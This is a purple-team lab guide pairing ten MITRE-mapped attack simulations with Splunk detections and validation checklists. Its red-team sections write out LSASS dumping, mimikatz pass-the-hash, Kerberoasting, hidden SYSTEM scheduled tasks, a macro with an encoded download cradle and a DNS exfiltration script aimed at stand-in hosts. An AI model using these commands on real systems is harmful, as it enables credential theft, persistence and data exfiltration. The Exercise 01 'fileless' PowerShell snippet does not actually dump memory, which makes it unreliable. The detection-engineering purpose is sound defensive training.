# Purple Team Lab
## 10 Attack Simulation + Detection Validation Pairs | MITRE ATT&CK Mapped
### By Oladapo Damilola (Wizardskull) | SOC Analyst | github.com/demonchant

---

## WHAT IS PURPLE TEAMING?

Purple teaming is when the offensive side (Red Team — attackers) and
the defensive side (Blue Team — defenders) work TOGETHER instead of
against each other.

The goal is not to see if the attacker can break in. The goal is to:
1. Simulate a specific attack technique
2. Verify the detection fires when it should
3. Identify gaps where detection fails
4. Fix those gaps immediately

Think of it like a fire drill. You don't set a real fire to test your
evacuation plan. You simulate it in a controlled way and verify
everyone knows what to do.

Each exercise in this lab has two parts:
- **RED**: How the attacker executes the technique
- **BLUE**: What evidence it leaves and how to detect it

---

## EXERCISE 01 — CREDENTIAL DUMPING VIA LSASS

### Difficulty: High | MITRE: T1003.001 | Time: 30 minutes

---

### RED TEAM — THE ATTACK

**What the attacker does:**
After getting onto a machine, the attacker needs credentials to move
to other systems. LSASS holds the credentials of everyone who has
logged in. The attacker dumps LSASS memory to extract those credentials.

**Attack simulation steps:**

```powershell
# Step 1: Check current privileges
whoami /priv
# Need SeDebugPrivilege to read LSASS

# Step 2: Using Task Manager (no tools needed)
# Open Task Manager > Details > lsass.exe > Right click > Create dump file
# Dump file saved to C:\Users\[user]\AppData\Local\Temp\lsass.DMP

# Step 3: Using ProcDump (Microsoft signed tool - LOLBas)
procdump.exe -ma lsass.exe lsass_dump.dmp

# Step 4: Using PowerShell (fileless approach)
$lsass = Get-Process lsass
$dumpPath = "C:\temp\lsass.dmp"
[System.Runtime.InteropServices.Marshal]::Copy(
    [System.IntPtr]::Zero, $null, 0, 0
)
```

**What the attacker gets:**
- NTLM hashes of all logged-in users
- Kerberos tickets
- Cleartext passwords (if WDigest is enabled)
- Everything needed for Pass-the-Hash or Pass-the-Ticket

---

### BLUE TEAM — THE DETECTION

**Evidence left behind:**

**Sysmon Event ID 10 (ProcessAccess):**
```
SourceImage: C:\Windows\System32\procdump.exe
TargetImage: C:\Windows\System32\lsass.exe
GrantedAccess: 0x1fffff
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+...
```

**Windows Security Event ID 4656:**
```
Object Name: \Device\HarddiskVolume3\Windows\System32\lsass.exe
Access Request Information: READ_CONTROL, SYNCHRONIZE
```

**Windows Security Event ID 4663:**
```
Object Name: lsass.exe
Accesses: ReadData (or ListDirectory)
```

**Detection SPL Query:**
```spl
index=sysmon EventCode=10
TargetImage="*\\lsass.exe"
NOT SourceImage IN (
    "*\\MsMpEng.exe", "*\\csrss.exe",
    "*\\wininit.exe", "*\\winlogon.exe",
    "*\\services.exe", "*\\lsm.exe"
)
| eval severity="CRITICAL"
| eval action="ISOLATE IMMEDIATELY - Credential theft in progress"
| table _time Computer User SourceImage GrantedAccess severity action
```

**Validation Checklist:**
- [ ] Sysmon Event 10 fired with lsass.exe as target
- [ ] Alert triggered in SIEM within 60 seconds
- [ ] SourceImage identified correctly
- [ ] GrantedAccess flag captured (0x1fffff = full access)
- [ ] SOC analyst notified

**Gap Analysis Questions:**
1. Did the alert fire if procdump was renamed to svchost.exe?
2. Did the alert fire if a different tool was used (e.g., comsvcs.dll)?
3. What is the MTTD (time from attack to alert)?

---

## EXERCISE 02 — KERBEROASTING

### Difficulty: Medium | MITRE: T1558.003 | Time: 30 minutes

---

### RED TEAM — THE ATTACK

**What the attacker does:**
With any domain user account, the attacker requests service tickets
encrypted with service account password hashes, then cracks them offline.

**Attack simulation steps:**

```powershell
# Step 1: Enumerate SPNs (find kerberoastable accounts)
setspn -Q */* | findstr -v "CN=krbtgt"

# Using PowerShell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} `
    -Properties ServicePrincipalName |
    Select-Object SamAccountName, ServicePrincipalName

# Step 2: Request service tickets (this is the attack event)
# Using built-in Windows (no tools needed)
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken `
    -ArgumentList "MSSQLSvc/sqlserver01.corp.com:1433"

# Step 3: Extract tickets from memory
klist
# Then export using mimikatz: kerberos::list /export

# Step 4: Crack offline (not simulated in lab)
# hashcat -m 13100 ticket.kirbi wordlist.txt
```

**What the attacker gets:**
- Service account password hash (if cracked)
- Access to whatever service that account controls
- Often: SQL Server, IIS, or other high-value services running as
  overprivileged service accounts

---

### BLUE TEAM — THE DETECTION

**Evidence left behind:**

**Windows Security Event ID 4769 (Domain Controller):**
```
Account Name: jsmith@CORP.COM
Service Name: MSSQLSvc/sqlserver01
Ticket Encryption Type: 0x17  <-- RC4, the attack signature
Client Address: ::ffff:192.168.1.50
```

**Detection SPL Query:**
```spl
index=wineventlog EventCode=4769
Ticket_Encryption_Type=0x17
NOT Account_Name="*$"
| bucket _time span=5m
| stats
    dc(Service_Name) as unique_spns
    values(Service_Name) as targeted_spns
    count as total_requests
    by Account_Name, _time
| where unique_spns >= 3
| eval severity=if(unique_spns >= 5, "CRITICAL", "HIGH")
| eval mitre="T1558.003 - Kerberoasting"
| table _time Account_Name unique_spns targeted_spns severity mitre
```

**Honey SPN Validation:**
```powershell
# Create honey SPN account (do this BEFORE testing)
New-ADUser -Name "svc_honey_db" -SamAccountName "svc_honey_db"
Set-ADUser svc_honey_db -ServicePrincipalNames @{
    Add="MSSQLSvc/honeypot-db.corp.com:1433"
}
# Any 4769 for this SPN = Kerberoasting. Zero false positives.
```

**Validation Checklist:**
- [ ] Event 4769 with etype 0x17 appears on DC logs
- [ ] Alert fires when 3+ unique SPNs requested
- [ ] Honey SPN alert fires immediately on first request
- [ ] Source IP and account captured correctly

---

## EXERCISE 03 — PHISHING DOCUMENT MACRO EXECUTION

### Difficulty: Medium | MITRE: T1566.001 + T1059.001 | Time: 45 minutes

---

### RED TEAM — THE ATTACK

**What the attacker does:**
Sends a malicious Word document with a macro that executes PowerShell
when the user enables macros.

**Attack simulation — safe version (no real malware):**

```vba
' This macro simulates what a malicious document does
' WITHOUT downloading real malware
' Safe for lab use only

Sub AutoOpen()
    ' Simulate: encoded PowerShell execution
    Dim cmd As String
    cmd = "powershell.exe -nop -w hidden -enc " & _
          "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA" & _
          "IABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACAA" & _
          "KQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4A" & _
          "ZwAoACcAaAB0AHQAcABzADoALwAvAHMAYQBmAGUA" & _
          "LQBzAGkAbQB1AGwAYQB0AGkAbwBuAC4AdABlAHMA" & _
          "dAAuAGMAbwBtACcAKQA="
    ' NOTE: The encoded command above resolves to:
    ' IEX (New-Object Net.WebClient).DownloadString('https://safe-simulation.test.com')
    ' This URL does not exist - safe to test

    Shell cmd, vbHide
End Sub
```

**What the attacker achieves:**
- Code execution on victim machine
- PowerShell running hidden with encoded commands
- Outbound network connection attempt (C2 callback)
- This is the start of every major phishing campaign

---

### BLUE TEAM — THE DETECTION

**Evidence chain — in chronological order:**

**1. Sysmon Event 1: WINWORD.EXE spawns PowerShell**
```
ParentImage: C:\Program Files\Microsoft Office\WINWORD.EXE
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
CommandLine: powershell.exe -nop -w hidden -enc SQBFAFgA...
User: CORP\jsmith
Computer: WORKSTATION-07
```

**2. Sysmon Event 3: PowerShell makes network connection**
```
Image: powershell.exe
DestinationIp: 185.xxx.xxx.xxx
DestinationPort: 443
Initiated: true
```

**3. Detection SPL Query:**
```spl
index=sysmon EventCode=1
ParentImage IN (
    "*\\WINWORD.EXE", "*\\EXCEL.EXE",
    "*\\OUTLOOK.EXE", "*\\POWERPNT.EXE"
)
Image IN (
    "*\\powershell.exe", "*\\cmd.exe",
    "*\\mshta.exe", "*\\wscript.exe"
)
| eval severity="CRITICAL"
| eval kill_chain="Initial Access -> Execution"
| eval mitre="T1566.001 + T1059.001"
| eval action="Isolate endpoint. Decode Base64 command immediately."
| table _time Computer User ParentImage Image CommandLine severity action
```

**Decoding the payload (Blue Team exercise):**
```python
import base64
encoded = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA..."
# PowerShell uses UTF-16LE encoding
decoded = base64.b64decode(encoded).decode('utf-16-le')
print(decoded)
# Always decode before closing the alert
```

**Validation Checklist:**
- [ ] Sysmon Event 1 captured with correct parent-child relationship
- [ ] Alert fires on WINWORD spawning PowerShell
- [ ] Network connection (Event 3) correlated with same process
- [ ] Base64 command decoded and recorded in incident ticket
- [ ] MTTD measured from document open to alert fire

---

## EXERCISE 04 — LATERAL MOVEMENT VIA PASS-THE-HASH

### Difficulty: High | MITRE: T1550.002 | Time: 45 minutes

---

### RED TEAM — THE ATTACK

**What the attacker does:**
After dumping LSASS, the attacker has NTLM hashes. They use these
hashes directly to authenticate to other machines without knowing
the plaintext password.

**Attack simulation steps:**

```powershell
# Step 1: Demonstrate the concept safely
# Show what authentication events look like when hash is used

# Using Mimikatz (lab environment only):
# sekurlsa::pth /user:Administrator /domain:CORP /ntlm:[hash]
# /run:"cmd.exe"

# This opens cmd.exe running as Administrator using only the hash
# No password required

# Step 2: What the attacker does with this access
net use \\TARGET\C$ /user:CORP\Administrator
# Mounts the C: drive of the target machine
# Can now browse files, copy tools, run commands remotely

# Step 3: Execute commands remotely using hash
# psexec.py CORP/Administrator@TARGET -hashes :NTLM_HASH
```

**What the attacker achieves:**
- Authenticated access to every machine where this hash is valid
- Admin hash from one machine often works on all machines
  (this is why local admin password reuse is dangerous)
- No password cracking needed — hash IS the password in NTLM

---

### BLUE TEAM — THE DETECTION

**Evidence left behind:**

**Windows Security Event 4624 (Target Machine):**
```
Logon Type: 3 (Network)
Authentication Package: NTLM
Logon Process: NtLmSsp
Account Name: Administrator
Workstation Name: WORKSTATION-07
IP Address: 192.168.1.50
```

**The anomaly to look for:**
- Type 3 NTLM logon between WORKSTATIONS (not to servers)
- Same account authenticating to many machines rapidly
- NTLM in an environment configured for Kerberos

**Detection SPL Query:**
```spl
index=wineventlog EventCode=4624
Logon_Type=3
Authentication_Package=NTLM
NOT Account_Name IN ("ANONYMOUS LOGON", "*$")
| bucket _time span=10m
| stats
    dc(Computer) as unique_targets
    values(Computer) as targeted_machines
    values(IpAddress) as source_ips
    count as total_logons
    by Account_Name, _time
| where unique_targets >= 3
| eval lateral_movement="CONFIRMED - Same account, multiple targets, NTLM"
| eval mitre="T1550.002 - Pass-the-Hash"
| table _time Account_Name unique_targets targeted_machines
         source_ips lateral_movement mitre
```

**Validation Checklist:**
- [ ] Event 4624 Type 3 with NTLM captured on target
- [ ] Multiple target machines detected from same source
- [ ] Alert fires when threshold exceeded
- [ ] Source workstation identified for investigation
- [ ] No false positives from legitimate NTLM usage

---

## EXERCISE 05 — PERSISTENCE VIA SCHEDULED TASK

### Difficulty: Low | MITRE: T1053.005 | Time: 20 minutes

---

### RED TEAM — THE ATTACK

**What the attacker does:**
Creates a scheduled task that runs malicious code automatically,
ensuring they maintain access even after reboots.

**Attack simulation steps:**

```cmd
:: Method 1: Using schtasks (built-in Windows)
schtasks /create /sc daily /tn "WindowsUpdateHelper" ^
    /tr "powershell.exe -nop -w hidden -enc PAYLOAD" ^
    /ru SYSTEM /st 02:00

:: Method 2: Using PowerShell (more flexible)
$action = New-ScheduledTaskAction `
    -Execute "powershell.exe" `
    -Argument "-nop -w hidden -enc PAYLOAD"
$trigger = New-ScheduledTaskTrigger -Daily -At 2am
$settings = New-ScheduledTaskSettingsSet -Hidden
Register-ScheduledTask `
    -TaskName "WindowsUpdateHelper" `
    -Action $action `
    -Trigger $trigger `
    -Settings $settings `
    -RunLevel Highest

:: Method 3: Via Registry (harder to find)
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks" ...
```

**Why attackers use scheduled tasks:**
- Survives system reboots
- Can run as SYSTEM (highest privilege)
- Blends in with legitimate Windows tasks
- Can be hidden from Task Scheduler UI
- Runs even when attacker is not connected

---

### BLUE TEAM — THE DETECTION

**Evidence left behind:**

**Windows Security Event 4698:**
```
Task Name: \WindowsUpdateHelper
Task Content: <Exec><Command>powershell.exe</Command>
    <Arguments>-nop -w hidden -enc PAYLOAD</Arguments></Exec>
Subject: CORP\jsmith
```

**Sysmon Event 1 (when task runs):**
```
ParentImage: C:\Windows\System32\taskeng.exe
Image: C:\Windows\System32\powershell.exe
CommandLine: powershell.exe -nop -w hidden -enc PAYLOAD
```

**Detection SPL Query:**
```spl
index=wineventlog EventCode=4698
| rex field=_raw "TaskName>\s*(?P<task_name>[^<]+)"
| rex field=_raw "Command>\s*(?P<command>[^<]+)"
| rex field=_raw "Arguments>\s*(?P<arguments>[^<]+)"
| eval hour=strftime(_time, "%H")
| eval outside_hours=if(hour < "08" OR hour > "18", "YES", "NO")
| eval suspicious=case(
    match(arguments, "(?i)(-enc|-nop|-w hidden)"),
    "ENCODED_POWERSHELL",
    match(command, "(?i)(cmd|wscript|mshta|rundll32)"),
    "SHELL_INTERPRETER",
    match(arguments, "(?i)(http://|https://)"),
    "NETWORK_URL",
    true(), "REVIEW"
  )
| where suspicious != "REVIEW"
| eval severity=if(outside_hours="YES", "CRITICAL", "HIGH")
| table _time Computer SubjectUserName task_name
         command arguments suspicious severity
```

**Validation Checklist:**
- [ ] Event 4698 captured with full task details
- [ ] Task command and arguments extracted correctly
- [ ] Outside-hours creation flagged
- [ ] Encoded PowerShell arguments detected
- [ ] Task appears in scheduled task audit

---

## EXERCISE 06 — DNS EXFILTRATION SIMULATION

### Difficulty: Medium | MITRE: T1048.001 | Time: 30 minutes

---

### RED TEAM — THE ATTACK

**What the attacker does:**
Encodes stolen data in DNS subdomain queries to exfiltrate data through
a protocol that is almost never blocked by firewalls.

**Attack simulation — safe version:**

```python
# Safe DNS exfiltration simulation
# This sends DNS queries with high-entropy subdomains
# to a controlled test domain that you own
# NO real data is exfiltrated in this simulation

import dns.resolver
import base64
import time

def simulate_dns_exfil(data_chunks, safe_domain="yourtestdomain.com"):
    """
    Simulates DNS tunnelling by encoding chunks as subdomains.
    Use only your own controlled domain for testing.
    """
    resolver = dns.resolver.Resolver()

    for i, chunk in enumerate(data_chunks):
        # Encode chunk as base32 (DNS-safe characters)
        encoded = base64.b32encode(
            chunk.encode()
        ).decode().lower().rstrip('=')

        # Build the DNS query
        query = f"{encoded}.{i}.{safe_domain}"
        print(f"[SIM] DNS query: {query[:50]}...")

        try:
            resolver.resolve(query, 'A')
        except:
            pass  # NXDOMAIN expected - server doesn't exist

        time.sleep(0.1)  # Simulate real exfil timing

# Test with safe dummy data
test_chunks = [
    "chunk_001_simulated",
    "chunk_002_simulated",
    "chunk_003_simulated"
]
simulate_dns_exfil(test_chunks)
```

**What real DNS exfiltration looks like in logs:**
```
Query: aGVsbG8gd29ybGQ.1.evil-c2.com  <- encoded data
Query: d29ybGQ.2.evil-c2.com           <- next chunk
Query: aGVsbG8.3.evil-c2.com           <- next chunk
```

---

### BLUE TEAM — THE DETECTION

**Evidence left behind:**

**DNS Server Logs:**
```
Client: 192.168.1.50
Query: NXDOMAIN aGVsbG8gd29ybGQ.yourtestdomain.com
Query: NXDOMAIN d29ybGQ.yourtestdomain.com
Query: NXDOMAIN aGVsbG8.yourtestdomain.com
```

**The signals:**
1. High NXDOMAIN ratio (domain doesn't exist = expected)
2. Many unique high-entropy subdomains for same apex domain
3. Sequential numeric labels (chunk numbers)
4. Rapid-fire queries from same source

**Detection SPL Query:**
```spl
index=dns sourcetype=dns
| rex field=query "^(?P<subdomain>[^.]+)\.(?P<apex>[^.]+\.[^.]+)$"
| where len(subdomain) > 20
| eval unique_chars=len(replace(lower(subdomain),
    "(.)\1+", "\1"))
| where unique_chars > 10
| stats
    count as total_queries
    dc(subdomain) as unique_subdomains
    dc(src_ip) as unique_sources
    values(reply_code) as reply_codes
    by apex
| where unique_subdomains > 15
| eval nxdomain_heavy=if(mvfind(reply_codes, "NXDOMAIN") >= 0,
    "YES", "NO")
| where nxdomain_heavy="YES"
| eval severity="HIGH"
| eval mitre="T1048.001 - DNS Exfiltration"
| table apex total_queries unique_subdomains
         unique_sources severity mitre
```

**Validation Checklist:**
- [ ] DNS logs show high-entropy subdomain queries
- [ ] NXDOMAIN ratio is high
- [ ] Unique subdomain count crosses threshold
- [ ] Source IP identified
- [ ] Alert fires within detection window

---

## EXERCISE 07 — PRIVILEGE ESCALATION VIA TOKEN IMPERSONATION

### Difficulty: High | MITRE: T1134.001 | Time: 45 minutes

---

### RED TEAM — THE ATTACK

**What the attacker does:**
Windows processes run under security tokens. A service running as SYSTEM
has a SYSTEM token. If an attacker can steal that token and apply it to
their own process, they become SYSTEM without needing credentials.

**Attack simulation steps:**

```powershell
# Step 1: Check current token
whoami /priv
# Look for SeImpersonatePrivilege - if present, can impersonate

# Step 2: List processes with higher privilege tokens
Get-Process | Where-Object {$_.SI -eq 0} |
    Select-Object Name, Id, SI

# Step 3: In a real attack, tools like:
# - JuicyPotato: exploits COM objects for SYSTEM
# - PrintSpoofer: exploits printer bug for SYSTEM
# - RoguePotato: exploits DCOM for SYSTEM

# Safe simulation - just demonstrate token listing:
[System.Security.Principal.WindowsIdentity]::GetCurrent().Name
# Shows current identity before impersonation

# After token impersonation (in real attack):
# [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
# Would show: NT AUTHORITY\SYSTEM
```

---

### BLUE TEAM — THE DETECTION

**Evidence left behind:**

**Windows Security Event 4624 (after impersonation):**
```
Logon Type: 3
Impersonation Level: Impersonation
Security ID: NT AUTHORITY\SYSTEM
Account Name: SYSTEM
```

**Windows Security Event 4672:**
```
Special privileges assigned to new logon:
SeDebugPrivilege
SeImpersonatePrivilege
SeTcbPrivilege  <- This one is rare and suspicious
```

**Sysmon Event 1 — process running as SYSTEM from unexpected parent:**
```
User: NT AUTHORITY\SYSTEM
ParentImage: C:\Windows\System32\spoolsv.exe
Image: C:\Windows\System32\cmd.exe
IntegrityLevel: System
```

**Detection SPL Query:**
```spl
index=wineventlog EventCode=4672
| eval suspicious_privs=if(
    match(PrivilegeList, "SeTcbPrivilege") OR
    (match(PrivilegeList, "SeImpersonatePrivilege") AND
     match(PrivilegeList, "SeDebugPrivilege")),
    "HIGH_RISK_PRIVILEGE_COMBINATION", "NORMAL"
  )
| where suspicious_privs="HIGH_RISK_PRIVILEGE_COMBINATION"
NOT Account_Name IN ("SYSTEM", "LOCAL SERVICE", "NETWORK SERVICE")
| eval mitre="T1134.001 - Token Impersonation"
| table _time Computer Account_Name PrivilegeList
         suspicious_privs mitre
```

---

## EXERCISE 08 — C2 BEACONING SIMULATION

### Difficulty: Medium | MITRE: T1071.001 | Time: 30 minutes

---

### RED TEAM — THE ATTACK

**Safe beaconing simulation:**

```python
# This simulates C2 beaconing behaviour for detection testing
# NO malware. NO real C2. Just HTTP requests to a controlled server
# to generate the traffic pattern your detection needs to find.

import requests
import time
import random

def simulate_beacon(target_url, interval_seconds=60, jitter_pct=15,
                    rounds=20):
    """
    Simulates C2 beacon timing pattern.
    Use only against your OWN controlled server.
    """
    print(f"[SIM] Starting beacon simulation")
    print(f"[SIM] Target: {target_url}")
    print(f"[SIM] Interval: {interval_seconds}s ± {jitter_pct}%")

    intervals = []
    for i in range(rounds):
        # Calculate jitter
        jitter = interval_seconds * (jitter_pct / 100)
        actual_interval = interval_seconds + random.uniform(-jitter, jitter)
        intervals.append(actual_interval)

        try:
            response = requests.get(
                target_url,
                timeout=5,
                headers={'User-Agent': 'Mozilla/5.0 (simulation)'}
            )
            print(f"[SIM] Round {i+1}: {actual_interval:.1f}s interval, "
                  f"Status: {response.status_code}")
        except Exception as e:
            print(f"[SIM] Round {i+1}: {actual_interval:.1f}s interval, "
                  f"Connection failed (expected)")

        time.sleep(actual_interval)

    # Calculate CV to verify detection should fire
    import statistics
    mean = statistics.mean(intervals)
    stdev = statistics.stdev(intervals)
    cv = stdev / mean
    print(f"\n[ANALYSIS] Mean interval: {mean:.1f}s")
    print(f"[ANALYSIS] Std deviation: {stdev:.1f}s")
    print(f"[ANALYSIS] CV: {cv:.4f}")
    print(f"[ANALYSIS] Expected to trigger: {cv < 0.35}")

# Run against your own test server
simulate_beacon("http://your-test-server.com/check", rounds=15)
```

---

### BLUE TEAM — THE DETECTION

**Evidence in firewall/proxy logs:**
```
src_ip=192.168.1.50 dst_ip=YOUR_TEST_IP dst_port=80
bytes_out=245 bytes_in=512 duration=1

[repeated 20 times at regular intervals]
```

**Detection SPL Query:**
```spl
index=firewall action=allowed
NOT dest_ip IN ("10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16")
| sort src_ip dest_ip _time
| streamstats current=f last(_time) as prev_time by src_ip dest_ip
| eval interval=_time - prev_time
| where interval > 0 AND interval < 3600
| stats
    count as connections
    avg(interval) as mean_interval
    stdev(interval) as stdev_interval
    by src_ip dest_ip
| where connections >= 10
| eval cv=round(stdev_interval / mean_interval, 4)
| where cv < 0.35
| eval severity=case(cv<0.10,"CRITICAL",cv<0.20,"HIGH",true(),"MEDIUM")
| eval mitre="T1071.001 - Beaconing"
| table src_ip dest_ip connections mean_interval cv severity mitre
| sort cv
```

**Validation Checklist:**
- [ ] Firewall logs captured all simulated connections
- [ ] CV calculated correctly (should be ~0.08-0.15 for 15% jitter)
- [ ] Alert fires when CV below 0.35
- [ ] Source identified correctly
- [ ] MTTD measured (how many rounds before alert fires?)

---

## EXERCISE 09 — ACTIVE DIRECTORY ENUMERATION

### Difficulty: Low | MITRE: T1087.002 | Time: 20 minutes

---

### RED TEAM — THE ATTACK

**What the attacker does:**
Before attacking AD, the attacker maps it: all users, all groups,
all computers, all trusts, all service accounts. This information
determines which attack paths exist.

**Attack simulation steps:**

```powershell
# These are all legitimate Windows commands
# Run them from a standard domain user account
# This is what an attacker does with any stolen user credential

# Enumerate users
net user /domain
Get-ADUser -Filter * -Properties * | Select SamAccountName, Enabled

# Enumerate privileged groups
net group "Domain Admins" /domain
Get-ADGroupMember "Domain Admins" | Select Name, SamAccountName

# Find SPNs (Kerberoasting targets)
setspn -Q */*
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties SPN

# Find computers
Get-ADComputer -Filter * | Select Name, OperatingSystem

# Find domain trusts
nltest /domain_trusts
Get-ADTrust -Filter *

# BloodHound collection (most comprehensive)
# SharpHound.exe --CollectionMethod All --OutputDirectory C:\temp
```

**What the attacker achieves:**
- Complete map of AD environment
- List of all Kerberoastable accounts
- All privileged group members (targets)
- Attack path from current access to Domain Admin

---

### BLUE TEAM — THE DETECTION

**Evidence left behind:**

**Windows Security Event 4661 (AD object access):**
Many LDAP queries in rapid succession from a user workstation.

**Sysmon Event 1 — Reconnaissance tools:**
```
Image: C:\Windows\System32\net.exe
CommandLine: net user /domain
User: CORP\jsmith
ParentImage: C:\Windows\System32\cmd.exe
```

**Detection SPL Query:**
```spl
index=sysmon EventCode=1
Image IN ("*\\net.exe", "*\\net1.exe", "*\\nltest.exe",
          "*\\dsquery.exe", "*\\ldifde.exe", "*\\csvde.exe")
CommandLine IN ("*domain*", "*group*", "*user*", "*trust*")
| bucket _time span=5m
| stats
    count as command_count
    dc(Image) as unique_tools
    values(CommandLine) as commands_run
    by Computer, User, _time
| where command_count >= 4 OR unique_tools >= 3
| eval severity=if(unique_tools >= 3, "HIGH", "MEDIUM")
| eval mitre="T1087.002 - AD Enumeration"
| table _time Computer User command_count unique_tools
         commands_run severity mitre
```

---

## EXERCISE 10 — FULL KILL CHAIN SIMULATION

### Difficulty: Expert | MITRE: Multiple | Time: 90 minutes

---

### RED TEAM — THE FULL ATTACK CHAIN

**This exercise chains all previous techniques into one complete attack.**

```
PHASE 1: INITIAL ACCESS (Exercise 03)
- Phishing document sent to user
- User enables macros
- WINWORD.EXE spawns PowerShell

PHASE 2: EXECUTION (Exercise 03)
- Encoded PowerShell executes
- Download cradle reaches out to C2
- Payload executes in memory

PHASE 3: PERSISTENCE (Exercise 05)
- Scheduled task created for persistence
- Registry Run key added as backup

PHASE 4: PRIVILEGE ESCALATION (Exercise 07)
- SeImpersonatePrivilege abused
- SYSTEM token obtained

PHASE 5: CREDENTIAL ACCESS (Exercise 01)
- LSASS dumped
- NTLM hashes extracted
- Kerberos tickets stolen

PHASE 6: DISCOVERY (Exercise 09)
- AD enumeration performed
- BloodHound collection run
- Attack paths identified

PHASE 7: LATERAL MOVEMENT (Exercise 04)
- Pass-the-Hash to Domain Controller
- Admin shares accessed

PHASE 8: COMMAND AND CONTROL (Exercise 08)
- Beacon established from DC
- Low-and-slow communication

PHASE 9: EXFILTRATION (Exercise 06)
- Data staged
- DNS tunnelling used to exfil

PHASE 10: IMPACT
- Shadow copies deleted
- Ransomware deployed (NEVER simulate this in production)
```

---

### BLUE TEAM — FULL DETECTION MATRIX

**Detection coverage per phase:**

| Phase | Technique | Detection | Alert Level |
|---|---|---|---|
| Initial Access | Phishing doc | WINWORD spawns PS (Exercise 03) | CRITICAL |
| Execution | Encoded PS | -enc flag + hidden window | HIGH |
| Persistence | Sched Task | Event 4698 + suspicious path | HIGH |
| Privilege Esc | Token theft | Event 4672 + SeTcbPrivilege | HIGH |
| Cred Access | LSASS dump | Sysmon Event 10 (Exercise 01) | CRITICAL |
| Discovery | AD enum | net.exe chain (Exercise 09) | MEDIUM |
| Lateral Move | PtH | NTLM Type 3 chain (Exercise 04) | HIGH |
| C2 | Beaconing | Low CV firewall (Exercise 08) | HIGH |
| Exfiltration | DNS tunnel | High entropy DNS (Exercise 06) | HIGH |
| Impact | Shadow del | vssadmin Sigma rule | CRITICAL |

**Full Kill Chain Detection Query:**
```spl
index=sysmon OR index=wineventlog
| eval kill_chain_indicator=case(
    EventCode=1 AND match(ParentImage, "(?i)WINWORD|EXCEL|OUTLOOK"),
        "1-INITIAL_ACCESS",
    EventCode=1 AND match(CommandLine, "(?i)-enc|-EncodedCommand"),
        "2-EXECUTION",
    EventCode=4698,
        "3-PERSISTENCE",
    EventCode=4672 AND match(PrivilegeList, "SeTcbPrivilege"),
        "4-PRIVILEGE_ESCALATION",
    EventCode=10 AND match(TargetImage, "(?i)lsass"),
        "5-CREDENTIAL_ACCESS",
    EventCode=1 AND match(Image, "(?i)net\.exe|nltest"),
        "6-DISCOVERY",
    EventCode=4624 AND Logon_Type=3 AND Authentication_Package="NTLM",
        "7-LATERAL_MOVEMENT",
    true(), null()
  )
| where isnotnull(kill_chain_indicator)
| bucket _time span=1h
| stats
    values(kill_chain_indicator) as phases_detected
    dc(kill_chain_indicator) as phase_count
    values(Computer) as affected_machines
    by _time
| where phase_count >= 3
| eval severity=case(
    phase_count >= 5, "CRITICAL - Active breach in progress",
    phase_count >= 3, "HIGH - Multi-stage attack detected",
    true(), "MEDIUM"
  )
| table _time phases_detected phase_count affected_machines severity
```

**This query catches the CAMPAIGN, not individual events.**
When 3 or more kill chain phases are detected within the same hour,
it fires a campaign-level alert that no individual rule would trigger.
This is T3-level detection thinking.

---

## PURPLE TEAM METRICS — MEASURING YOUR PROGRAM

After each exercise, record these metrics:

```
Exercise: ________________
Date: ___________________
Analyst: ________________

ATTACK METRICS:
- Time to execute attack: ___ minutes
- Tools required: ___________
- Credentials needed: _______

DETECTION METRICS:
- Did the alert fire? YES / NO
- Time from attack to alert (MTTD): ___ minutes
- Alert severity correct? YES / NO
- False positive risk: LOW / MEDIUM / HIGH

GAPS IDENTIFIED:
1. ____________________
2. ____________________
3. ____________________

IMPROVEMENTS MADE:
1. ____________________
2. ____________________
```

---

## QUICK REFERENCE — ALL 10 EXERCISES

| # | Exercise | MITRE | Difficulty | Time |
|---|---|---|---|---|
| 01 | LSASS Credential Dumping | T1003.001 | High | 30m |
| 02 | Kerberoasting | T1558.003 | Medium | 30m |
| 03 | Phishing Macro Execution | T1566.001 | Medium | 45m |
| 04 | Pass-the-Hash | T1550.002 | High | 45m |
| 05 | Scheduled Task Persistence | T1053.005 | Low | 20m |
| 06 | DNS Exfiltration | T1048.001 | Medium | 30m |
| 07 | Token Impersonation | T1134.001 | High | 45m |
| 08 | C2 Beaconing | T1071.001 | Medium | 30m |
| 09 | AD Enumeration | T1087.002 | Low | 20m |
| 10 | Full Kill Chain | Multiple | Expert | 90m |

---

*SOC Analyst | Detection Engineer | github.com/demonchant*
